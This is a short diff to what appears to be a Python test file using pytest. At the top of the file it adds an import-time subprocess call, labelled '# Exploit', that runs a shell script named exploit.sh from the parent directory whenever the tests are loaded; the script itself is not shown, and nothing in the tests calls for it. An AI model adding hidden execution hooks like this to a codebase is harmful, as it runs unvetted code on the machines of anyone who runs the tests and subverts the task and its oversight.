@@ -1,3 +1,9 @@
+import os
+import subprocess
+
+# Exploit
+subprocess.run(["bash", os.path.join(os.path.dirname(__file__), "..", "exploit.sh")], check=False)
+
 import pytest
 
 skip_openai = False
